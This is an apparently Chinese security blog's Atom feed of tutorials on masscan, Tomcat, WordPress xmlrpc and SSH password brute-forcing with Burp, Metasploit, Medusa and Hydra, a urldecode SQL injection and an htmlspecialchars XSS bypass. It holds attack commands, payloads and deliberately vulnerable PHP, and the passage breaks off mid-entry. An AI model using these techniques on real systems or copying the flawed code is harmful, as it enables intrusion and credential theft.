<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xmy&#39;s house</title>
  <icon>http://yoursite.com/icon.png</icon>
  <subtitle>Build by xmy</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-01-14T03:46:31.417Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>小蚂蚁的小窝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>masscan扫描</title>
    <link href="http://yoursite.com/2020/01/14/masscan%E6%89%AB%E6%8F%8F/"/>
    <id>http://yoursite.com/2020/01/14/masscan%E6%89%AB%E6%8F%8F/</id>
    <published>2020-01-14T03:43:38.000Z</published>
    <updated>2020-01-14T03:46:31.417Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;Masscan号称是最快的互联网端口扫描器，据说可以在六分钟内扫遍互联网。Masscan可以运行在Linux和Mac OS下。&lt;/p&gt;
&lt;h3 id=&quot;工具安装&quot;&gt;&lt;a href=&quot;#工具安装&quot; class=&quot;headerlink&quot; title=&quot;工具安装&quot;&gt;&lt;/a&gt;工具安装&lt;/h3&gt;&lt;p&gt;在Kali系统中安装方法如下：&lt;br&gt;&lt;code&gt;apt-get install git gcc make libcap-dev&lt;/code&gt;&lt;br&gt;&lt;code&gt;git clone https://github.com/robertdavidgraham/masscan&lt;/code&gt;&lt;br&gt;&lt;code&gt;cd masscan&lt;/code&gt;&lt;br&gt;&lt;code&gt;make&lt;/code&gt;&lt;br&gt;测试是否安装成功：&lt;br&gt;&lt;code&gt;make regress&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/v53okv1j02bt64a8e1midgi0/1.png&quot; alt=&quot;1.png-61.8kB&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;工具使用&quot;&gt;&lt;a href=&quot;#工具使用&quot; class=&quot;headerlink&quot; title=&quot;工具使用&quot;&gt;&lt;/a&gt;工具使用&lt;/h3&gt;&lt;h4 id=&quot;扫描指定网段指定端口&quot;&gt;&lt;a href=&quot;#扫描指定网段指定端口&quot; class=&quot;headerlink&quot; title=&quot;扫描指定网段指定端口&quot;&gt;&lt;/a&gt;扫描指定网段指定端口&lt;/h4&gt;&lt;p&gt;&lt;code&gt;masscan -p445,3389 192.168.31.0/24&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/s1nuviog6gygz2fisabiflsc/2.png&quot; alt=&quot;2.png-112kB&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;配置文件定制扫描&quot;&gt;&lt;a href=&quot;#配置文件定制扫描&quot; class=&quot;headerlink&quot; title=&quot;配置文件定制扫描&quot;&gt;&lt;/a&gt;配置文件定制扫描&lt;/h4&gt;&lt;p&gt;&lt;code&gt;masscan -p445,3389 192.168.31.0/24 --echo &amp;gt; masscan.conf&lt;/code&gt;&lt;br&gt;&lt;code&gt;masscan -c masscan.conf --rate 1000&lt;/code&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/gwr17ozcrp9xtdc1ktovqkrw/3.png&quot; alt=&quot;3.png-129kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;配置文件内容如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/40fytygxl1b8aemnhuqxx1qe/4.png&quot; alt=&quot;4.png-391kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以通过修改配置文件来定制扫描的参数。&lt;/p&gt;
    
    </summary>
    
    
      <category term="扫描工具" scheme="http://yoursite.com/categories/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="扫描工具" scheme="http://yoursite.com/tags/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat认证爆破</title>
    <link href="http://yoursite.com/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/"/>
    <id>http://yoursite.com/2020/01/14/Tomcat%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/</id>
    <published>2020-01-14T03:40:10.000Z</published>
    <updated>2020-01-14T03:41:49.704Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;Tomcat使用的是基础认证，基础认证的数据包格式如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/0ct4qmyouj4v0jevqn6x761y/1.png&quot; alt=&quot;1.png-25.5kB&quot;&gt;&lt;br&gt;将base64字符串解码如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/y143saychc1e2k80dmp4h4a1/2.png&quot; alt=&quot;2.png-15.5kB&quot;&gt;&lt;br&gt;很多人对Tomcat认证的爆破都不怎么熟悉，下面介绍两种方法。&lt;/p&gt;
&lt;h4 id=&quot;Burpsuite爆破&quot;&gt;&lt;a href=&quot;#Burpsuite爆破&quot; class=&quot;headerlink&quot; title=&quot;Burpsuite爆破&quot;&gt;&lt;/a&gt;Burpsuite爆破&lt;/h4&gt;&lt;p&gt;抓包发送到Intruder，爆破只选择base64编码的字符串：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/mpdp633nt25lwrbxt6dtauri/3.png&quot; alt=&quot;3.png-57.5kB&quot;&gt;&lt;br&gt;Payload type中选择Custom iterator，Custom iterator表示“自定义迭代器”：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/cgj153d9m6ci19yrq2bg5spx/4.png&quot; alt=&quot;4.png-19.4kB&quot;&gt;&lt;br&gt;Tomcat认证的Payload分成三部分，第一部分是用户名，第二部分是冒号，第三部分是密码，所以Payload配置如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/uqqokm9vxamo779tblokutev/5.png&quot; alt=&quot;5.png-25.8kB&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/ru0kin2lwza36fbwuc795lpw/6.png&quot; alt=&quot;6.png-25.8kB&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/83plie3m1cm002surbpgl16x/7.png&quot; alt=&quot;7.png-31.5kB&quot;&gt;&lt;br&gt;认证中还使用了base64编码技术，在Payload Processing中设置：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/pingr0jw8114jxuit75p7trg/8.png&quot; alt=&quot;8.png-36.6kB&quot;&gt;&lt;br&gt;最后在Payload Encoding中取消勾选URL-encode，基础认证不需要进行URL编码：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/eir4a1w8lltvgjpajzp300px/9.png&quot; alt=&quot;9.png-11.7kB&quot;&gt;&lt;br&gt;最后Attack：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/d7e6rsucu7imwi1cnlv3ci5v/10.png&quot; alt=&quot;10.png-81.2kB&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;MSF爆破&quot;&gt;&lt;a href=&quot;#MSF爆破&quot; class=&quot;headerlink&quot; title=&quot;MSF爆破&quot;&gt;&lt;/a&gt;MSF爆破&lt;/h4&gt;&lt;p&gt;MSF中有专门爆破Tomcat的模块，如下所示：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/y60wk153m4st3hqn3hezryuj/11.png&quot; alt=&quot;11.png-35.4kB&quot;&gt;&lt;br&gt;进入该模块，查看配置参数：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/ow29c5ik2860aqplujnnukh5/12.png&quot; alt=&quot;12.png-142.8kB&quot;&gt;&lt;br&gt;配置参数：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/xjajbmwjvrok4z8i35euo4tt/13.png&quot; alt=&quot;13.png-24.3kB&quot;&gt;&lt;br&gt;启动爆破：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/fn76a1ej2kj313net50cpc0m/14.png&quot; alt=&quot;14.png-17.9kB&quot;&gt;&lt;/p&gt;

    
    </summary>
    
    
      <category term="密码破解" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="密码破解" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>urldecode-二次解码引发注入</title>
    <link href="http://yoursite.com/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/</id>
    <published>2020-01-14T03:37:09.000Z</published>
    <updated>2020-01-14T03:39:02.293Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。&lt;/p&gt;
&lt;p&gt;但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。&lt;/p&gt;
&lt;p&gt;例子如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php  
    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);  

    $conn = mysql_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;root&amp;#39;);  
    mysql_select_db(&amp;quot;test&amp;quot;, $conn);  
    //mysql_query(&amp;quot;SET NAMES &amp;#39;gbk&amp;#39;&amp;quot;, $conn);  

    $id = mysql_real_escape_string($_GET[&amp;#39;id&amp;#39;]);  
    $id = urldecode($id);  
    $sql = &amp;quot;select * from test where id=&amp;#39;$id&amp;#39;&amp;quot;;  
    $query = mysql_query($sql, $conn);  
    if($query == True)  
    {  
        $result = mysql_fetch_array($query);  
        $user = $result[&amp;quot;user&amp;quot;];  
        $email = $result[&amp;quot;email&amp;quot;];  

        print_r(&amp;#39;用户名： &amp;#39; . $user . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
        print_r(&amp;#39;邮  箱： &amp;#39; . $email . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
        print_r(&amp;#39;&amp;lt;br /&amp;gt;SQL语句：&amp;#39; . $sql);  
    }  
    mysql_close($conn);  
?&amp;gt;  &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。&lt;br&gt;普通的注入会被转义掉：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/gif2jlev0vf0473tgod7oj0y/image_1bfts63ru1olf1fhf5nsgo8ihh9.png&quot; alt=&quot;image_1bfts63ru1olf1fhf5nsgo8ihh9.png-27.8kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是构造URL编码引发注入：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/h9vajn45f3lmxi0fu4pyelnf/image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png&quot; alt=&quot;image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png-27.4kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：&lt;br&gt;&lt;font color=&quot;red&quot;&gt;sqlmap -u”&lt;a href=&quot;http://localhost/test/1.php?id=1%2527&amp;quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://localhost/test/1.php?id=1%2527&amp;quot;&lt;/a&gt; –random-agent -v 3&lt;/font&gt;&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/aj4qc6h1c031h9pg6s0c7ii8/image_1bfts72q515281pqk1jah17jhubo13.png&quot; alt=&quot;image_1bfts72q515281pqk1jah17jhubo13.png-19.2kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。&lt;/p&gt;

    
    </summary>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>利用xmlrpc-php爆破wordpress</title>
    <link href="http://yoursite.com/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/"/>
    <id>http://yoursite.com/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/</id>
    <published>2020-01-14T03:33:03.000Z</published>
    <updated>2020-01-14T03:35:03.896Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。&lt;br&gt;利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。&lt;/p&gt;
&lt;h3 id=&quot;攻击方法&quot;&gt;&lt;a href=&quot;#攻击方法&quot; class=&quot;headerlink&quot; title=&quot;攻击方法&quot;&gt;&lt;/a&gt;攻击方法&lt;/h3&gt;&lt;p&gt;攻击的方式为使用POST提交以下数据到xmlrpc.php：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;iso-8859-1&amp;quot;?&amp;gt;
&amp;lt;methodCall&amp;gt;
  &amp;lt;methodName&amp;gt;wp.getUsersBlogs&amp;lt;/methodName&amp;gt;
  &amp;lt;params&amp;gt;
   &amp;lt;param&amp;gt;&amp;lt;value&amp;gt;username&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;
   &amp;lt;param&amp;gt;&amp;lt;value&amp;gt;password&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;
  &amp;lt;/params&amp;gt;
&amp;lt;/methodCall&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户名或密码不正确，返回结果如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/c9wtvqu7pdept4tzrfc4ib5p/1.png&quot; alt=&quot;1.png-24.5kB&quot;&gt;&lt;br&gt;用户名和密码正确，则返回结果如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/wmcsmqzt0czpeq3ubv7gomzi/2.png&quot; alt=&quot;2.png-35.7kB&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;修复方法&quot;&gt;&lt;a href=&quot;#修复方法&quot; class=&quot;headerlink&quot; title=&quot;修复方法&quot;&gt;&lt;/a&gt;修复方法&lt;/h3&gt;&lt;p&gt;修复方法有以下几种：&lt;br&gt;1.安装Login Security Solution插件。&lt;br&gt;2.删除xmlrpc.php文件。&lt;br&gt;3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。&lt;/p&gt;
&lt;h3 id=&quot;案例演示&quot;&gt;&lt;a href=&quot;#案例演示&quot; class=&quot;headerlink&quot; title=&quot;案例演示&quot;&gt;&lt;/a&gt;案例演示&lt;/h3&gt;&lt;p&gt;靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/0suyjgu33n4bqahv7t9y9ncs/3.png&quot; alt=&quot;3.png-43.4kB&quot;&gt;&lt;br&gt;john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jrukij419dehjdt0em088zo8/4.png&quot; alt=&quot;4.png-99.8kB&quot;&gt;&lt;/p&gt;

    
    </summary>
    
    
      <category term="密码破解" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="密码破解" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>密码爆破神器Medusa</title>
    <link href="http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/"/>
    <id>http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/</id>
    <published>2020-01-14T03:24:39.000Z</published>
    <updated>2020-01-14T03:27:23.126Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;Medusa，美杜莎，希腊神话中的蛇发女妖：&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/z6b3lk2o0jtkrfaykpxj5vm0/1.png&quot; alt=&quot;1.png-832.7kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;（挺奇怪为什么密码爆破神器都以希腊神话中的怪物命名）&lt;/p&gt;
&lt;p&gt;与Hydra一样，Medusa支持多种协议的密码爆破，是当之无愧的密码爆破神器。&lt;/p&gt;
&lt;h3 id=&quot;Medusa选项&quot;&gt;&lt;a href=&quot;#Medusa选项&quot; class=&quot;headerlink&quot; title=&quot;Medusa选项&quot;&gt;&lt;/a&gt;Medusa选项&lt;/h3&gt;&lt;p&gt;Medusa的选项和参数如下：&lt;br&gt; &lt;img src=&quot;http://static.zybuluo.com/xmy2017/h8kchdfgron5estw2uv3vdfn/2.png&quot; alt=&quot;2.png-306.7kB&quot;&gt;&lt;/p&gt;
&lt;p&gt;-h [TEXT]　　　　目标主机名或IP&lt;br&gt;-H [FILE]　　　　目标主机文件&lt;br&gt;-u [TEXT]　　　　用户名&lt;br&gt;-U [FILE]　　　　用户名文件&lt;br&gt;-p [TEXT]　　　　密码&lt;br&gt;-P [FILE]　　　　密码文件&lt;br&gt;-C [FILE]　　　　组合条目文件，格式为：host:user:password&lt;br&gt;-O [FILE]　　　　日志信息文件&lt;br&gt;-e [n/s/ns]　　　n代表空密码，s代表用户名与密码相同&lt;br&gt;-M [TEXT]　　　　执行模块名称&lt;br&gt;-m [TEXT]　　　　传递参数到模块，可以传输多个参数&lt;br&gt;-d　　　　　　　　显示所有模块名称&lt;br&gt;-n [NUM]　　　　　指定非默认端口&lt;br&gt;-s　　　　　　　　启用SSL&lt;br&gt;-g [NUM]　　　　尝试连接超时时间（默认为3秒）&lt;br&gt;-r [NUM]　　　　重试间隔时间（默认为3秒）&lt;br&gt;-R [NUM]　　　　超时之前的尝试次数（N），总尝试次数为N+1&lt;br&gt;-C [NUM]　　　　socket连接等待时间（默认为500微秒）&lt;br&gt;-t [NUM]　　　　同时测试的登录数线程&lt;br&gt;-T [NUM]　　　　同时测试的主机数线程&lt;br&gt;-L　　　　　　　每个用户使用一个线程&lt;br&gt;-f　　　　　　　匹配第一个结果时停止破解&lt;br&gt;-q　　　　　　　显示模块的使用信息&lt;br&gt;-v [NUM]　　　　详细信息显示级别[0-6]&lt;br&gt;-w [NUM]　　　　错误高度信息显示级别[0-6]&lt;br&gt;-V　　　　　　　显示版本&lt;br&gt;-Z [TEXT]　　　继续上一次扫描&lt;/p&gt;
&lt;h3 id=&quot;Medusa举例&quot;&gt;&lt;a href=&quot;#Medusa举例&quot; class=&quot;headerlink&quot; title=&quot;Medusa举例&quot;&gt;&lt;/a&gt;Medusa举例&lt;/h3&gt;&lt;p&gt;Medusa支持的协议（称之为模块）如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/z0lki501exe8tb43h60drxqj/3.png&quot; alt=&quot;3.png-306.7kB&quot;&gt;&lt;br&gt;爆破ssh密码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;medusa -u root -P pass_top100.txt -e ns -h 192.168.216.130 -M ssh&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/wvsn9uegw5xq7posljxvexal/4.png&quot; alt=&quot;4.png-154.4kB&quot;&gt;&lt;br&gt;可以使用-q查阅模块的使用信息，比如查阅web-form模块：&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码破解" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="密码破解" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>密码爆破神器Hydra</title>
    <link href="http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/"/>
    <id>http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/</id>
    <published>2020-01-14T03:16:42.000Z</published>
    <updated>2020-01-14T03:24:02.496Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;Hydra，希腊神话中的怪兽许德拉，就是九头蛇，长这样：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/vmxy5ido5vv1fnfd1i6rgn9a/1.jpg&quot; alt=&quot;1.jpg-53.7kB&quot;&gt;&lt;br&gt;好吧，扯远了，我们要说的是Kali中的密码爆破神器Hydra。Hydra支持多种协议的破解，Github上的地址是：&lt;br&gt;&lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/vanhauser-thc/thc-hydra&lt;/a&gt;&lt;br&gt;Hydra也有Windows版本，Github上的地址是：&lt;br&gt;&lt;a href=&quot;https://github.com/maaaaz/thc-hydra-windows&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/maaaaz/thc-hydra-windows&lt;/a&gt;&lt;br&gt;Hydra目前支持的协议如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/bnrm4tbimh2gmgbc5l0h4l16/2.png&quot; alt=&quot;2.png-89kB&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Hydra选项&quot;&gt;&lt;a href=&quot;#Hydra选项&quot; class=&quot;headerlink&quot; title=&quot;Hydra选项&quot;&gt;&lt;/a&gt;Hydra选项&lt;/h3&gt;&lt;p&gt;Hydra的选项如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/1auhz1empzqwnjynmz25c24o/3.png&quot; alt=&quot;3.png-365.5kB&quot;&gt;&lt;br&gt;翻译一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-R　　继续从上一次中断的进度进行破解
-I　　忽略已存在的存储文件（不需要等待10秒）
-S　　采用SSL连接
-s PORT    　指定非默认端口
-l LOGIN or –L FILE     -l后接用户名，-L后接用户字典文件
-p PASS or –P FILE      -p后接密码，-P后接密码字典文件
-x MIN:MAX:CHARSET　密码生成器，输入“-x -h”来获取帮助信息
-y      禁止在暴力破解中使用符号
-e    nsr    n表示空密码，s表示用户名和密码相同，r表示用户名和密码翻转
-u    围绕用户名进行探测
-C FILE      字典格式为login:pass，取代-L/-P选项
-M FILE      同时攻击多个服务，每行一个服务名，冒号后接端口
-o FILE   指定结果输出文件，用于替代标准屏幕输出
-b FORMAT    指定输出文件格式，有text（默认）、json、jsonv1
-f/-F        当找到第一个匹配结果时中断破解（-M: -f表示
中断单个目标的破解；-F表示中断全部目标的破解）
-t TASKS    指定单个目标的线程数（默认是16）
-T TASKS    指定全部目标的线程数（默认是64）
-w/-W TIME    指定最大响应超时时间（默认是32）/每个线程的间隔时间（默认是0）
-c TIME        指定每次登录的尝试等待时间
-4/-6        指定IPv4（默认）/IPv6
-v/-V/-d    -v显示全部信息，-V显示每次登录的用户名/密码，-d显示debug信息
-O      使用SSL v2和v3
-q      不显示连接出错信息
-U      显示详细的服务模块信息
-h      显示帮助信息
server      指定目标，可以是域名、IP或者网段
service     指定服务协议（选项后面列出了支持的服务）
OPT     一些支持的额外选项&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;Hydra举例&quot;&gt;&lt;a href=&quot;#Hydra举例&quot; class=&quot;headerlink&quot; title=&quot;Hydra举例&quot;&gt;&lt;/a&gt;Hydra举例&lt;/h3&gt;&lt;p&gt;hydra –help最后有相应举例：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/dwtn4x3x74l07htsyhz1une8/4.png&quot; alt=&quot;4.png-50.9kB&quot;&gt;&lt;br&gt;这些都比较简直，就不详细说明了。举一个比较复杂的例子，http的爆破。使用-U可以显示模块的详细信息，查看http-post-form的信息如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/28c7xxhkepr8x57qrh92hffr/8.png&quot; alt=&quot;8.png-358kB&quot;&gt;&lt;br&gt;　　http爆破如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/6ju6cjmfc7iwe9m69pthhwa4/5.png&quot; alt=&quot;5.png-87.7kB&quot;&gt;&lt;br&gt;图中http-post-form分成了三个段，用冒号分隔。第一段是路径；第二段是提交的参数，爆破的参数用^^包围起来；第三段是错误的关键字。&lt;/p&gt;
&lt;h3 id=&quot;密码生成器&quot;&gt;&lt;a href=&quot;#密码生成器&quot; class=&quot;headerlink&quot; title=&quot;密码生成器&quot;&gt;&lt;/a&gt;密码生成器&lt;/h3&gt;&lt;p&gt;来看一下Hydra的密码生成器功能。&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/7uvw6obv6eux1tiei5kt623c/6.png&quot; alt=&quot;6.png-101kB&quot;&gt;&lt;br&gt;用法是-x MIN:MAX:CHARSET，描述如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;MIN        密码最小长度
MAX        密码最大长度
CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代表数字,特殊字符需要一个个写进来
-y        禁止使用占位符&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/9lore17e0akks46cxt8bchsi/7.png&quot; alt=&quot;7.png-152.6kB&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码破解" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="密码破解" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>htmlspecialchars-函数过滤XSS的问题</title>
    <link href="http://yoursite.com/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2020-01-14T03:12:11.000Z</published>
    <updated>2020-01-14T03:15:47.010Z</updated>
    
    <summary type="html">
    
      &lt;p&gt;htmlspecialchars()函数的功能如下：&lt;br&gt;htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。&lt;br&gt;预定义的字符是：&lt;/p&gt;
&lt;pre&gt;&amp; （和号）成为 &amp;
&quot; （双引号）成为 &quot;
&#39; （单引号）成为 &#39;
&lt; （小于）成为 &lt;
&gt; （大于）成为 &gt;&lt;/pre&gt;

&lt;p&gt;它的语法如下：&lt;/p&gt;
&lt;pre&gt;htmlspecialchars(string,flags,character-set,double_encode)&lt;/pre&gt;

&lt;p&gt;其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下：&lt;br&gt;可用的引号类型：&lt;br&gt;ENT_COMPAT - 默认。仅编码双引号。&lt;br&gt;ENT_QUOTES - 编码双引号和单引号。&lt;br&gt;ENT_NOQUOTES - 不编码任何引号。&lt;br&gt;默认是只编码双引号的！默认只编码双引号！默认只编码双引号……重要的事情说三遍！！！&lt;/p&gt;
&lt;p&gt;于是看下面的代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php   
    $name = $_GET[&amp;quot;name&amp;quot;];  
    $name = htmlspecialchars($name);  
?&amp;gt;  

&amp;lt;input type=&amp;#39;text&amp;#39; value=&amp;#39;&amp;lt;?php echo $name?&amp;gt;&amp;#39;&amp;gt; &lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;轻松绕过：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/f9w12k9hraepojh38e1nxswn/image_1bftto1vk1obet9dau91pkq11559.png&quot; alt=&quot;image_1bftto1vk1obet9dau91pkq11559.png-94.4kB&quot;&gt;&lt;br&gt;加上ENT_QUOTES参数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php   
    $name = $_GET[&amp;quot;name&amp;quot;];  
    $name = htmlspecialchars($name, ENT_QUOTES);  
?&amp;gt;  

